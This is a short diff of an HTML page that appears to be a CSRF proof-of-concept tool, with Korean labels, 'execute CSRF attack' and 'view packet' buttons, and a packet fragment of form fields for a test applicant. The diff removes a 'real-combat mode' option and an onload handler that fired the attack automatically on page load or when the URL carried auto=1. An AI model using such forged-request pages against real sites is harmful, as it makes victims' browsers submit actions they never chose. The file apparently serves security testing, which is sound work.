@@ -252,11 +252,6 @@
             <input type="text" id="nameInput" value="seuctest1" placeholder="신청자 이름을 입력하세요">
         </div>
 
-        <div class="auto-submit">
-            <input type="checkbox" id="autoSubmit">
-            <label for="autoSubmit">페이지 로드 시 자동 공격 실행 (실전 모드)</label>
-        </div>
-
         <div class="button-container">
             <button class="attack-btn" onclick="executeAttack()">🚀 CSRF 공격 실행</button>
             <button class="packet-btn" onclick="togglePacket()">📦 패킷 보기</button>
@@ -329,18 +324,6 @@ applcntNm=seuctest1&applcntMbtlnum=010-2477-4209&cmpnySchulNm=%EB%B3%B4%EC%95%88
             packet.classList.toggle('show');
         }
 
-        // 자동 실행 체크박스 확인
-        window.onload = function() {
-            const autoSubmit = document.getElementById('autoSubmit');
-
-            // URL 파라미터로 자동 실행 확인
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('auto') === '1' || autoSubmit.checked) {
-                setTimeout(() => {
-                    executeAttack();
-                }, 1000);
-            }
-        };
     </script>
 </body>
 </html>
